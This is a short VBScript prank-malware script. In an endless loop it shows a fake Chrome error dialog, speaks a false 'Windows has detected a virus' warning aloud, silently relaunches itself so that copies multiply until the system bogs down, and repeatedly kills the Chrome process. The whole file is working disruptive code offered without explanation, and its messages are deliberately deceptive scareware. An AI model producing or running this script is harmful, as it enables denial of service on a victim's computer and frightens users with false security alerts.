Do
	x = msgbox("Windows had an error loading chrome", 1+16, "Chrome")
	WScript.Sleep(2000)
	FullName = WScript.ScriptFullName
	Set shell = CreateObject("WScript.Shell")
	set data=createobject("sapi.spvoice")
	data.speak "Warning Windows has detected a virus on your computer, please run a scan."
	shell.Run "cmd /c WScript " + FullName, 0
	shell.Run "cmd /c taskkill /im chrome.exe", 0
Loop